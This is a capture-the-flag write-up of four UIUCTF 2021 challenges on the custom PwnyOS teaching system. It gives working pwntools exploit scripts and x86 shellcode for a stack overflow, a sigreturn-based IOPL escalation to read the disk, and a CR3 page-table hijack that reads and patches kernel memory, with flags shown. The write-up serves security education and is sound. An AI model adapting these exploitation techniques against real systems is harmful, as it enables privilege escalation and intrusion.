# UIUCTF 2021 PwnyOS 1.1 Challenges
PwnyOS is a custom operating system that was developed for uiuctf 2020 and made a return in 2021 with a new version(1.1). I found it a very interesting idea that taught me a lot about how things work at a lower level in operating systems and computers, so I'd like to thank Ravi for taking the effort to create the OS and these challenges.

In uiuctf 2021, there were 4 challenges using PwnyOS - Twitch Plays PwnyOS, Pwny OS: Hidden Hard Drive, and parts 1 and 2 of PwnyOS: Zeroday
Before reading these writeups, I reccomend you read some of the documentation [here](https://github.com/sigpwny/pwnyOS-2020-docs) from uiuctf 2020, and also some of the patch notes from 2021(relevant for the last 3 challenges) [here](https://raw.githubusercontent.com/sigpwny/PwnyOS-uiuctf-2021-docs/main/1.1%20Release%20Notes.pdf)
## Twitch Plays PwnyOS
<img width="463" alt="challenge description" src="https://user-images.githubusercontent.com/62653826/128640851-51c00b11-ba5f-42c9-befe-2ca4ff55bd8b.png">



PwnyOS is i386 and entails a custom list of syscalls. The goal of this challenge is to find a hidden syscall between 8900 and 9100 and call it, in which case the flag will be printed.

Going to the twitch stream at the link, there is an instance of PwnyOS being streamed. Every message in the twitch stream that is or encodes a single character(we can send messages such as ^c, ^x, back, enter, period, etc. to represent the corresponding character) is taken as a "vote" for a keyboard key to be pressed. Every 10 seconds the chat is checked for votes, and the first vote of the batch of votes gets enacted.

Slowly, character by character, it is possible to navigate the instance. The challenge description gives credentials to login with(root:daisy) at the login screen, from which we get dropped into the RASH shell.
We need to find a way to achieve arbitrary code execution(pwnyos has a read only file system) in order to be able to execute syscalls. First of all, by running ls, we can see /root, /bin and /prot directories. /prot contains a password file which contains the credentials we already know. /root/flag.txt does not actually contain the flag, and instead says what we already know - the flag can be printed by executing the correct syscall. However, /bin has some interesting elf files.

<img width="58" alt="binaries" src="https://user-images.githubusercontent.com/62653826/128640808-e2665d1e-86e7-4f01-babd-b30baa723a80.png">

Reading the guide from uiuctf 2020, binexec is something that gives arbitrary shellcode execution. This is exactly what we require. Shellcode must be hex encoded, and then done must be sent afterwards, with a newline. Note that PwnyOS still uses x86, so shellcoding is the same except for different syscalls. First, I and many people tried a naive approach to just bruteforce all numbers from 8900 to 9100 by incrementing eax, however this failed.

<img width="393" alt="binexec" src="https://user-images.githubusercontent.com/62653826/128644815-dc7ef6e7-0922-4525-a5f8-2f7665206a7a.png"> <img width="660" alt="Naive shellcode" src="https://user-images.githubusercontent.com/62653826/128644824-eff6bcec-093a-44a5-aca9-d6e2d0aea219.png">



The program ended up exiting after that shellcode was entered with exit code 0x1b(which happened to be in ebx for some reason). This confused me, until I realised the issue from doing more tests - after an incorrect syscall is done, it's treated as an error, thus causing eax to be set to 0xffffffff. After incrementing this, eax becomes 0, which is the exit code syscall. Eax, ebx, ecx and edx are not preserved after a syscall is done, so to count the current syscall we just need to use a different register and then move it into eax when needed. I used esi.

<img width="520" alt="correct shellcode" src="https://user-images.githubusercontent.com/62653826/128644864-53a5ad49-f104-4a55-a13f-a36b2bc8c666.png">


I was the first to craft working shellcode and successfully execute it on the twitch, however I was slow to transcribe it to the flag submission box, and ended up being the 5th solve. Turns out there were 5 other teams quietly watching me. A few other teams solved after that from copying my shellcode, and then various other solves came to follow. My main issue with the challenge was the publicity, but other than that it was an interesting introudction to PwnyOS.

<img width="405" alt="Flag" src="https://user-images.githubusercontent.com/62653826/128645002-bdb2b60b-b261-414c-a9e2-22bca85414b3.png">

Flag: `uiuctf{t34mw0rk_r3ally_m4k35_th3_dream_w0rk}`

## Hidden Hard Drive

<img width="443" alt="Challenge description" src="https://user-images.githubusercontent.com/62653826/128645141-f4daee63-d892-4765-9a43-5b980e0e6865.png">


I will screenshot the release notes as required.

This was the only pwnyos challenge I did not solve during the ctf, due to failure to examine every nook and cranny of the information. However with a nudge from Ravi I was able to solve it about 13 hours after the ctf ended.

For this challenge and the next two, we're given a local instance of pwnyos, allowing for debugging and also for reversing the kernel.

In this challenge, there is no binexec, and instead an ELF called hidden_hard_drive. Furtheremore, the hard disk drive hda is loaded with the flag. This is not accessable from the file system.

There are 3 steps to this challenge - exploiting the program to gain shellcode execution, elevating privilege level, and reading the flag.

### Exploiting the Program
PwnyOS still uses the ELF file format(with a few requirements) and is just i386, so reversing is simple. I used ghidra.

![Decompilation](https://user-images.githubusercontent.com/62653826/128645290-07ca108d-11cd-4493-b2c7-0e462d8ca0c3.png)


The program prints the address of the input, and then reads 256 bytes into it. The buffer, however, is on the stack and only 64 bytes long, giving stack overflow. The buffer is at ebp - 0x44, giving an offset of 0x48 bytes(fill up buffer and saved ebp) until we can overwrite RIP. The binary has no NX or anything, so a simple ret2shellcode attack can be executed.

```python
from pwn import *
import time
e = ELF("./fs/fs/bin/hidden_hard_drive")
context.arch = "i386"
p = process("./start.sh",shell=True) if args.LOCAL else remote('hiddenhd-pwnyos.chal.uiuc.tf', 1337)
NUM_TO_RET = 0x48

# Run vulnerable binary
time.sleep(5)
p.sendline("hidden_hard_drive")
p.recvuntil("0x")
bufaddr = int(p.recvline(), 16)
log.info(f"Buffer address: {hex(bufaddr)}")
#sc =
payload = fit({0: sc, NUM_TO_RET: bufaddr})
pause()
p.sendline(payload)
```
The OS takes a little time to boot, so I added a sleep before running the binary.

Arbitrary shellcode execution has been achieved.

### Elevating Privilege Level

Part of the challenge is understanding exactly what "increase your privilege level" means.

However, we need to be able to communicate with the I/O ATA ports(0x1f0 - 0x1f7, given in the release notes). Trying to run the instructions in and out(allowing for reading data from port devices and writing data to port devices, respectively) causes a general protection fault. I didn't find this during the ctf and had to be hinted by Ravi afterwards, but this is controlled by the [IOPL](https://en.wikipedia.org/wiki/Protection_ring#IOPL)

The IOPL(I/O Privilege Level) controls what rings(aka CPL/current permission level) are required to access I/O ports. If the CPL is less than or equal to the IOPL, then the process can access I/O ports at the time. By default while executing our shellcode, the IOPL is 0, so only CPL/ring 0(the kernel) can access I/O ports. We're in usermode, which is CPL/ring 3(the user). So, we need to set IOPL to 3.

Bits 12 and 13 of the EFLAGS register control the IOPL. Usually it isn't possible for us to control this from usermode, however, there's a little bug that allows us to do this.

We have 3 more syscalls now in PwnyOS 1.1 - sighandler_install(install a handler for a signal), sigreturn(restores user registers) and getphys(gets the physical address of the mmap page, not useful for this challenge but will be useful for zeroday)

The key is in the sigreturn syscall, which pops a frame containing stored registers off the stack.

<img width="683" alt="Sigreturn" src="https://user-images.githubusercontent.com/62653826/128645389-96c87b77-97eb-417c-847f-4c96a423cb6f.png">


EFLAGS is popped off the stack. However, sigreturn runs from the kernel, and can very much control IOPL. There's no checks in the kernel against this, so executing the sigreturn syscall allows us to change the IOPL.

To execute sigreturn on its own we'd have to fake the stack etc. manually, which I decided not to do. When a signal handler is executed due to a SIGSEGV or SIGINT,  a sigreturn frame is pushed onto the stack, along with some code to execute sigreturn (also the return address is set to the address of the trampoline, so that is on the top of the stack)

<img width="590" alt="Sigreturn frame" src="https://user-images.githubusercontent.com/62653826/128645406-c46c6a38-7502-4753-9658-0a620896f4be.png">


This allows the program to get back to exactly where it was after the signal is handled - when the signal handler returns, it will execute the trampoline code, restoring the registers from the sigreturn frame, and returning to where it was.

Anyways, this means that from the signal handler code, we can simply tweak the frame to have more malicious values.

The mask for IOPL is 0x3000

<img width="928" alt="EFLAGS information" src="https://user-images.githubusercontent.com/62653826/128645461-9f2dd048-3220-48d2-a57a-dae68065625d.png">


So simply ORing the previous value of EFLAGS with 0x3000 will set IOPL to 3(setting both bits)

Here's what I did:
* Use shellcode to read more new shellcode onto the stack, for 256 uninterrupted bytes
* Register the address of the new shellcode as a SIGSEGV handler
* Cause a segmentation fault(SIGSEGV) by reading an address that does not exist

```python
from pwn import *
import time
e = ELF("./fs/fs/bin/hidden_hard_drive")
context.arch = "i386"
p = process("./start.sh",shell=True) if args.LOCAL else remote('hiddenhd-pwnyos.chal.uiuc.tf', 1337)
NUM_TO_RET = 0x48

# Run vulnerable binary
time.sleep(5)
p.sendline("hidden_hard_drive")
p.recvuntil("0x")
bufaddr = int(p.recvline(), 16)
log.info(f"Buffer address: {hex(bufaddr)}")
newshellcode = bufaddr + 0x50
sc = asm(f"mov eax, 4; xor ebx, ebx; mov ecx, {hex(newshellcode)}; mov edx, 0x100 ; int 0x80")
# Register the new shellcode as sigsegv handler
sc += asm(f"xor ebx, ebx ; mov ecx, {hex(newshellcode)} ; mov eax, 14 ; int 0x80")
# Trigger sigsegv
sc += asm(f"mov eax, 0xdeadbeef ; mov dword ptr [eax], 0")
payload = fit({0: sc, NUM_TO_RET: bufaddr})
pause()
p.sendline(payload)
time.sleep(2)
handler = asm("mov ebx, dword ptr [esp+44] ; or ebx, 0x3000 ; mov dword ptr [esp+44], ebx")
handler += asm(f"mov dword ptr [esp+36], {hex(newshellcode + 0x17)}; ret")
```
The first piece of shellcode simply reads new shellcode, registers the sigsegv handler, and triggers a sigsegv by trying to read 0xdeadbeef.

<img width="716" alt="Handler stack" src="https://user-images.githubusercontent.com/62653826/128645495-ab7064c7-dfe9-4bdc-aab3-0f1500cc36f7.png">


As shown in the above figure, eflags is at index 10 in the frame(will be 11 on the stack because the return address is also there, so esp + 4*11).  Meanwhile, eip is at index 8, and for the same reasons as previous, will be at esp + 4 * 9. As well as setting the IOPL to 0, it edits the eip to instead point to directly after the `ret` instruction - so the additional data in `handler` will be executed afterwards, when the IOPL is 3.

We have successfully elevated privileges.

### Getting the Flag

Now, we must interact with the ports to read the flag. ATA PIO ports have specific purposes and formats that we must utilise in order to read the flag - we cannot just start reading from a port and expect it to work.

<img width="953" alt="ATA Ports" src="https://user-images.githubusercontent.com/62653826/128645553-7dac4f6d-4510-4a47-81af-9e5e432ddac8.png">


Since the beginning of the hda is just the flag file, the address that we want to read from is just 0x0, which makes everything much easier. Otherwise we'd have to craft an LBA(local black address) that describes the specific sector we wish to read.

I used the directions [here](https://wiki.osdev.org/ATA_PIO_Mode#x86_Directions) to read from the hard disk.

First, we need to select a drive using 0x1f6. We want to use the master drive, since the flag is connected to the main hard drive(hda) we will send 0xe0. Since the LBA we want is just 0x0, we never have to have to worry about bits of the LBA.

Next, we can send a null byte to 0x1f1 for good measure.

Afterwords, we write to the sector count register(port 0x1f2) to define the amount of sectors we want to read. I just sent 0, which defaults to 256. This value doesn't really matter.

Then, port 0x1f3, port 0x1f4, and port 0x1f5. These all take 8 bits of the LBA to combine in order to create the sector address. Since our LBA is just 0x0, to all of these ports we just send a null byte.

Finally, before the read, we send 0x20 to 0x1f7(the command register). This command signals the device to allow us to read from the hard disk finally. In an actual environment, we would use a loop to keep polling until the hard disk is ready to give us the data(this can take several cpu cycles, which is why mmio is more popular). 

Afterwards, I use the rep insw instruction, which copies `ecx` words from port `dx` to the address `edi` to copy the flag into some free memory, and then the write syscall to write this to stdout.

Instead of polling, however, I just let nature take its course. After the new shellcode was simply a bunch of null bytes, which translates to the add byte ptr [eax], al. When eax isn't a valid address, this causes a sigsegv. Since our sigsegv handler is automatically configured to elevate privileges and attempt to read the flag, the process will be stuck in a constant loop of grabbing the flag. So, the flag gets spammed to stdout.


```python
from pwn import *
import time
e = ELF("./hidden_hard_drive")
context.arch = "i386"
p = process("./start.sh",shell=True) if args.LOCAL else remote('hiddenhd-pwnyos.chal.uiuc.tf', 1337)
NUM_TO_RET = 0x48

# Run vulnerable binary
time.sleep(5)
p.sendline("hidden_hard_drive")
p.recvuntil("0x")
bufaddr = int(p.recvline(), 16)
log.info(f"Buffer address: {hex(bufaddr)}")
newshellcode = bufaddr + 0x50
sc = asm(f"mov eax, 4; xor ebx, ebx; mov ecx, {hex(newshellcode)}; mov edx, 0x100 ; int 0x80")
# Register the new shellcode as sigsegv handler then trigger sigsegv
sc += asm(f"xor ebx, ebx ; mov ecx, {hex(newshellcode)} ; mov eax, 14 ; int 0x80")
sc += asm(f"mov eax, 0xdeadbeef ; mov dword ptr [eax], 0")
payload = fit({0: sc, NUM_TO_RET: bufaddr})
pause()
p.sendline(payload)
time.sleep(2)
handler = asm("mov ebx, dword ptr [esp+44] ; or ebx, 0x3000 ; mov dword ptr [esp+44], ebx")
handler += asm(f"mov dword ptr [esp+36], {hex(newshellcode + 0x17)}; ret")
handler += asm("mov dx, 0x1f6 ; mov al, 0xe0 ; out dx, al")
handler += asm("sub dx, 5 ; xor al, al ; out dx, al") # dx: 0x1f1
handler += asm("inc dx ; out dx, al") # dx: 0x1f2
handler += asm("inc dx ; out dx, al") # dx: 0x1f3
handler += asm("inc dx ; out dx, al") # dx: 0x1f4
handler += asm("inc dx ; out dx, al") # dx: 0x1f5
handler += asm("mov dx, 0x1f7 ; mov al, 0x20 ; out dx, al") # dx: 0x1f7
handler += asm("sub dx, 7 ; mov ecx, 0x20 ; mov edi, 0x8249000 ; rep insw") # dx: 0x1f0
handler += asm("xor ebx, ebx ; mov ecx, 0x8249000 ; mov edx, 0x40 ; mov eax, 5 ; int 0x80")
p.sendline(handler)
p.interactive()
```
Flag: `uiuctf{ata_1s_my_f4v0r1t3_x86_pc_featur3}`

## Zeroday Challenges
There is a secet undocumented syscall, as well as 3 new ones for PwnyOS 1.1. The first 2(sighandler_install and sigreturn) aren't of much help for this challenge, but the last one, syscall 16(getphys) is useful, giving the physical address of the mmap page.

Moving from challenge 1 to challenge 2 isn't a lot of steps, so I'll write these up in one.

### Part 1
#### Finding the mysterious syscall

![Part 1](https://user-images.githubusercontent.com/62653826/128645666-36c0b28e-0c34-4266-a8b9-99027a4347e8.png)

Our goal here is to gain arbitrary kernel memory read, and then read the flag from kernel memory. To do this, first of all, we need to find the hidden syscall. To do this, I decided to find the syscall table. In this image, we have binexec, so executing shellcode becomes easy.

I added `-s` to the qemu options, which creates a gdb server listening on port 1234. This allows for debugging, even the kernel.  All that is required is to run gdb, and then the gdb command `target remote :1234`, and you'll be connected.

We can analyse the kernel using ghidra(however I found ghidra mismapped some kernel data addresses), and also dump the instructions via objdump.

When debugging qemu with gdbserver, stepping from an int 0x80  allows you to see the kernel code behind it.

After running int 0x80, the kernel starts executing from 0x403d33. This pushes the registers onto the stack, calls a handling function, and then pops from the stack.
```assembly
  403d33:	6a 00                	push   0x0
  403d35:	50                   	push   eax
  403d36:	51                   	push   ecx
  403d37:	52                   	push   edx
  403d38:	53                   	push   ebx
  403d39:	55                   	push   ebp
  403d3a:	56                   	push   esi
  403d3b:	57                   	push   edi
  403d3c:	54                   	push   esp
  403d3d:	e8 da db ff ff       	call   0x40191c
  403d42:	83 c4 04             	add    esp,0x4
  403d45:	5f                   	pop    edi
  403d46:	5e                   	pop    esi
  403d47:	5d                   	pop    ebp
  403d48:	5b                   	pop    ebx
  403d49:	5a                   	pop    edx
  403d4a:	59                   	pop    ecx
  403d4b:	83 c4 04             	add    esp,0x4
  403d4e:	83 c4 04             	add    esp,0x4
  403d51:	cf                   	iret   
```
Checking out the handling function, it checks that eax is not greater than 30, which already hints to what the hidden syscall number might be, since the highest syscall we know of is 16. Then, it uses the eax of usermode(syscall number) to index a jump table at 0x505c98
```assembly
  4019ae:	8b 45 f0             	mov    eax,DWORD PTR [ebp-0x10]
  4019b1:	c1 e0 02             	shl    eax,0x2
  4019b4:	05 98 5c 50 00       	add    eax,0x505c98
  4019b9:	8b 00                	mov    eax,DWORD PTR [eax]
  4019bb:	3e ff e0             	notrack jmp eax
```
Dumping this table in gdb, we get a bunch of function addresses.

![Syscall table](https://user-images.githubusercontent.com/62653826/128645750-30f0cbbd-c4d2-406a-92ec-fde454858747.png)


Every invalid syscall points to 0x401cc8 - a piece of code that simply returns 0xffffffff, indicating an error. The addresses of documented syscalls aren't important to us that much right now, however we'll look at the instructions for the write syscall later.

Interestingly, index 30, the last entry in the table, is valid. **This** is the hidden syscall, at 0x401ca5

#### Understanding the mysterious syscall
```assembly
  401ca5:	0f 20 c0             	mov    eax,cr0
  401ca8:	25 ff ff ff 7f       	and    eax,0x7fffffff
  401cad:	0f 22 c0             	mov    cr0,eax
  401cb0:	8b 45 ec             	mov    eax,DWORD PTR [ebp-0x14]
  401cb3:	0f 22 d8             	mov    cr3,eax
  401cb6:	0f 20 c0             	mov    eax,cr0
  401cb9:	0d 00 00 00 80       	or     eax,0x80000000
  401cbe:	0f 22 c0             	mov    cr0,eax
  401cc1:	b8 00 00 00 00       	mov    eax,0x0
  401cc6:	eb 05                	jmp    0x401ccd
```
`0x401ccd` is a code snippet(part of `0x401cc8`, just after eax gets set to 0xffffffff) that simply acts as a `leave ; ret`

ebp-0x14 coresponds to ebx in the user registers dump. This means that the code for the hidden syscall makes some changes to cr0, and then loads the first argument into cr3. Using the [information here](https://en.wikipedia.org/wiki/Control_register#CR0), we can find that cr0 controls various things in the kernel. The and instruction saves the first 31 bits of cr0, whilst the or instruction sets the 32nd bit(bit index 31) to 1. This enables paging, which means that the cpu will use cr3 to access the page directory table, which maps virtual memory to physical memory. Since this syscall gives free overwrite of cr3, this let's us control the mapping between virtual and physical memory. This is *powerful*, and gives us complete control over the entirety of memory, if used correctly.

#### Using the mysterious syscall

So, let's sum up what we have so far
* Can mmap 4 MiB of memory
* Can get the physical address of this mmaped page
* Can overwrite cr3

cr3 takes a physical memory address, since trying to go to virtual memory for the table that tells you how virtual memory works is pretty counterproductive. Strictly, we don't need getphys syscall since the OS doesn't use any address randomisation so everything is constant. But, it makes the shellcode a little cleaner. Before we start messing with the page directory, we should understand it at least a little bit.

So, how does the page directory work?

In a 32-bit system, virtual memory has room 4 GiB of information(0x00000000-0xffffffff). This splits evenly into 1024 4 MiB pages, which each also split evenly into 1024 4 KiB mini pages.

The page directory is exactly 4 KiB in length, and the address must be aligned to 4 KiB.

Each entry in the page directory corresponds to one 4 MiB page. Entry 0 corresponds to 0x0 in virtual memory, Entry 1 corresponds to 0x400000, Entry 2 corresponds to 0x800000, etc. 

Each entry is 4 bytes long(4 * 1024 = 4 KiB) and points to one of two things

* A 4 MiB aligned physical memory address, which will correspond to the current page in virtual memory directly
* A 4 KiB aligned physical memory address, which corresponds to the page table for this page

When a page needs to be split into 4 KiB sections each with different physical memory mappings, permissions data etc., then the page directory entry will point to a page table, which is very similar to the page directory. I won't go into detail about the page table, because it's irrelevant to exploiting this challenge. If you want to learn about it, [here is a link](https://wiki.osdev.org/Paging#Page_Directory) to information about the page directory and page table.

The page directory also contains information about the page it is coding for - the flags of interest to us are
* Page Size(pointing to page table or directly to the page's physical memory)
* User/Supervisor - Accessible to the user - mask 0x4
* Read/Write - Writeable, or readonly - mask 0x2
* Present - Confirming the page actually exists, otherwise there'd be a lot of pages that point to physical memory address 0x0 - mask 0x1

When the page size bit is on, we'll also set the Accessed bit(showing that the page has been accessed) and can get the Ignored bit, I just do for good measure since it is usually set. This makes the mask 0xe0.

To debug physical memory, we can use the qemu monitor. Change the `-monitor none` to `-monitor telnet:127.0.0.1:1337,server,nowait` , which serves the qemu monitor locally on the port 1337. This allows us to run some commands, such as dumping physical memory and getting information about registers.

```
(qemu) info registers
info registers
EAX=00000001 EBX=00000000 ECX=00000000 EDX=00508020
ESI=00000000 EDI=00000000 EBP=00527df7 ESP=00527ddf
EIP=0040039f EFL=00000202 [-------] CPL=0 II=0 A20=1 SMM=0 HLT=1
ES =001b 00000000 ffffffff 00cff300 DPL=3 DS   [-WA]
CS =0008 00000000 ffffffff 00cf9a00 DPL=0 CS32 [-R-]
SS =0010 00000000 ffffffff 00cf9300 DPL=0 DS   [-WA]
DS =001b 00000000 ffffffff 00cff300 DPL=3 DS   [-WA]
FS =001b 00000000 ffffffff 00cff300 DPL=3 DS   [-WA]
GS =001b 00000000 ffffffff 00cff300 DPL=3 DS   [-WA]
LDT=0030 00507168 00000020 00108200 DPL=0 LDT
TR =0028 00507100 00000068 00108900 DPL=0 TSS32-avl
GDT=     00507000 00000038
IDT=     0051f000 00000800
CR0=80000011 CR2=00000000 CR3=0050c000 CR4=00000010
DR0=00000000 DR1=00000000 DR2=00000000 DR3=00000000 
DR6=ffff0ff0 DR7=00000400
EFER=0000000000000000
FCW=037f FSW=0000 [ST=0] FTW=00 MXCSR=00001f80
FPR0=0000000000000000 0000 FPR1=0000000000000000 0000
FPR2=0000000000000000 0000 FPR3=0000000000000000 0000
FPR4=0000000000000000 0000 FPR5=0000000000000000 0000
FPR6=0000000000000000 0000 FPR7=0000000000000000 0000
XMM00=00000000000000000000000000000000 XMM01=00000000000000000000000000000000
XMM02=00000000000000000000000000000000 XMM03=00000000000000000000000000000000
XMM04=00000000000000000000000000000000 XMM05=00000000000000000000000000000000
XMM06=00000000000000000000000000000000 XMM07=00000000000000000000000000000000
(qemu) pmemsave 0 0x8000000 memdump
```

By default, cr3 is 0x50c000. I dumped the memory, so I could look at what the page directory values are normally. I used `xxd -e -g4 -c4 -a -s <physical address> -l <length> memdump` to read memory.

First of all, let's read the first few entries of the page directory.
```
0050c000: 0050d003  ..P.
0050c004: 004000e3  ..@.
0050c008: 00000000  ....
0050c00c: 00000000  ....
```

The first entry, the page at 0x0, doesn't have the page size bit on. This means that it uses 4 kib paging, and therefore points to a page table. This isn't that interesting, but we should note it down to replicate. The page table for this is at 0x50d000

The second entry corresponds to the page at 0x400000(this is where the kernel is in virtual memory). Interestingly, this is also where it is in physical memory. The page size bit *is* on here, so it just points to the 4 MiB physical memory page. Note that the usermode bit is not on, so the user can't access this page(we'll change that in a bit)

I did this memory dump whilst running binexec to replicate the exact environment. Binaries are always loaded at 0x8040000, which strictly is at the page 0x8000000 - index 32. 32 * 4 = 0x80, so we can index the page directory.

At `0x50c080`, which corresponds to `0x8000000`, the entry is `020000e7`. The page size bit is on, but also this time, bit 2 is on(usermode). This is because the user is meant to access this. If we read appropriate offsets, we can find the ELF header etc.

This is all that's important for us. When faking the page directory, we should make sure to map these pages, since it'll get very messy if the CPU can't access those parts of virtual memory.

To be able to get arbitrary kernel read, the solution is simple - fake the page directory using the mmap page, and use this to make the kernel accessible by the user.
The following code makes the mmap page, gets the physical address and sets cr3 to it. It causes the OS to crash, because the mmap page has no actual page directory entries in it, so the virtual memory literally does not exist.
```assembly
mov eax, 13
int 0x80
mov eax, 16
int 0x80
mov ebx, eax
mov eax, 30
int 0x80
```

However, we can now edit the mmap page to be valid. We know what the page directory entries *should* be, so faking it is not hard.

However, this time, let's set the user bit in the entry for the kernel page. This gives us arbitrary kernel memory read(and write), making it easy to get the flag.

```assembly
mov eax, 13
int 0x80
mov esi, eax
mov dword ptr [esi], 0x0050d003
mov dword ptr [esi+4], 0x004000e7
mov dword ptr [esi+128], 0x020000e7
mov eax, 16
int 0x80
mov ebx, eax
mov eax, 30
int 0x80
```

Now, to get the part 1 flag, we just have to find the flag in kernel memory. In the kernel disassembly, navigating to the entry, we can see it eventually jumps to a function which calls a memcpy equivalent. At this point in time, the kernel is running in **real mode**, meaning physical memory can be directly accessed(and is by default). The kernel copies 128 bytes from physical memory address 0x44440000(part 1 flag) to 0x5a6784 in virtual memory. The kernel still won't let us write address 0x5a6784 to stdout, but now it's readable, so we can use rep movsb to copy the bytes to userland memory and then print.

```assembly
mov eax, 13
int 0x80
mov esi, eax
mov dword ptr [esi], 0x0050d003
mov dword ptr [esi+4], 0x004000e7
mov dword ptr [esi+128], 0x020000e7
mov eax, 16
int 0x80
mov ebx, eax
mov eax, 30
int 0x80
mov esi, 0x5a67c0
mov edi, 0x804c020
mov ecx, 0x80
rep movsb
xor ebx, ebx
mov ecx, 0x804c020
mov edx, 0x80
mov eax, 5
int 0x80
```
Executing this shellcode in binexec prints the part 1 flag.
```
/ $ binexec
binexec
Welcome to binexec!
Type some shellcode in hex and I'll run it!

Type the word 'done' and press enter when you are ready
Type 'exit' and press enter to quit the program
Address where I'm gonna run your code: 0804E0A0
B80D000000CD8089C6C70603D05000C74604E7004000C78680000000E7000002B810000000CD8089C3B81E000000CD80BEC0675A00BF20C00408B980000000F3A431DBB920C00408BA80000000B805000000CD80done
B80D000000CD8089C6C70603D05000C74604E7004000C78680000000E7000002B810000000CD8089C3B81E000000CD80BEC0675A00BF20C00408B980000000F3A431DBB920C00408BA80000000B805000000CD80done
Running...
uiuctf{y0uv3_m4pp3d_th3_mem_but_c4n_y0u_3xecute_c0de?}
eax: 00000037
ebx: 00000000
ecx: 0804C020
edx: 00000080
Done! Type more code
Address where I'm gonna run your code: 0804E0A0
```

### Part 2

<img width="470" alt="Screenshot 2021-08-08 at 22 05 16" src="https://user-images.githubusercontent.com/62653826/128645671-e7daa091-1452-4f86-b7a0-24ba4f4ba451.png">

The other flag is in physical memory at 0x55550000, but not in kernel memory. 0x55550000 is not a 4 MiB aligned address, so we can't just make a virtual memory page map to 0x55550000, but we can map it to 0x55400000, and then offset by 0x150000. The issue is that the memory I/O qemu driver acts differently in user mode(ring 3) and kernel mode(ring 0). We need CPL/ring 0 to get the flag - that is, we need to read physical memory address 0x55550000 from CPL 0. One path would be to use our new access to kernel data to overwrite some functions with shellcode, but there is a much easier way to get this done.

Think - how can we get the kernel to read some data for us, without exploiting it much?

That's right - the write syscall. If we get the kernel to write out data mapped to physical address 0x55550000, it'll get read from ring 0, doing the job for us and printing the flag from stdout. Issue is, without remapping very important memory, the kernel's check for userland pointers will do us in the dust(it ensures that pointer >> 0x16 == 0x20, so the pointer must be around 0x8000000). However, it does this through running a function, and then a jz to a function that will deny the user. 

**Exploitation path**
* We can map a page to the needed physical memory
* Nop the function call(the jz is only 2 bytes), making the kernel unable to reject any write calls
*  Write the memory corresponding to 0x55550000 to fd 0. 

I decided to map 0x09000000 to 0x55400000, so reading address 0x09150000 will read the flag.
```assembly
mov eax, 13
int 0x80
mov esi, eax
mov dword ptr [esi], 0x0050d003
mov dword ptr [esi+4], 0x004000e7
mov dword ptr [esi+128], 0x020000e7
mov dword ptr [esi+144], 0x554000e7
mov eax, 16
int 0x80
mov ebx, eax
mov eax, 30
int 0x80
mov esi, 0x401a99
mov word ptr [esi], 0x9090
xor ebx, ebx
mov ecx, 0x9000000
add ecx, 0x150000
mov edx, 0x80
mov eax, 5
int 0x80
```

```
/ $ binexec
binexec
Welcome to binexec!
Type some shellcode in hex and I'll run it!

Type the word 'done' and press enter when you are ready
Type 'exit' and press enter to quit the program
Address where I'm gonna run your code: 0804E0A0
B80D000000CD8089C6C70603D05000C74604E7004000C78680000000E7000002C78690000000E7004055B810000000CD8089C3B81E000000CD80BE991A400066C706909031DBB90000000981C100001500BA80000000B805000000CD80done
B80D000000CD8089C6C70603D05000C74604E7004000C78680000000E7000002C78690000000E7004055B810000000CD8089C3B81E000000CD80BE991A400066C706909031DBB90000000981C100001500BA80000000B805000000CD80done
Running...
uiuctf{y0u_h4v3_0ffic1ally_be4t3n_PwnyOS_1-come_b4ck_n3xt_y34r_f0r_PwnyOS-2}eax: 0000004C
ebx: 00000000
ecx: 09150000
edx: 00000080
Done! Type more code
```

## Footnote

And that's a wrap! Again, I really enjoyed solving these challenges, and this is an amazingly creative and fun idea. I'm super excited for PwnyOS 2! Thank you to @ravi for making these challenges, and thank you all the creators for making this CTF.
